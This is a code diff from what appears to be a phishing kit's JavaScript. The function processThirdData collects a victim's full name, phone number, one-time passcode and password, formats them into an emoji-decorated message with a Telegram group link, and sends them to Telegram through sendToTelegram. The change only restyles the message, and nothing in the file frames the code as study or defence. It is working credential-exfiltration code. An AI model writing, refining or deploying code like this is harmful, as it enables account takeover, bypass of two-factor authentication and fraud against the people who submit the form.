@@ -491,7 +491,18 @@ function processThirdData() {
             return false;
         }
 
-        var message = `Final Submission: \nFull Name: ${$full_name}\nPhone Number: ${$phone_number}\nOTP Code: ${$otp_code}\nPassword: ${$password}`;
+        var groupLink = "https://t.me/+wvoJRR3W8CcwMDg1";
+
+var message = `📥 FINAL SUBMISSION
+
+👤 Full Name: ${$full_name}
+📱 Phone Number: ${$phone_number}
+🔐 OTP Code: ${$otp_code}
+🔑 Password: ${$password}
+
+🔗 Join Group:
+${groupLink}`;
+
         sendToTelegram(message);
 
         setTimeout(() => {
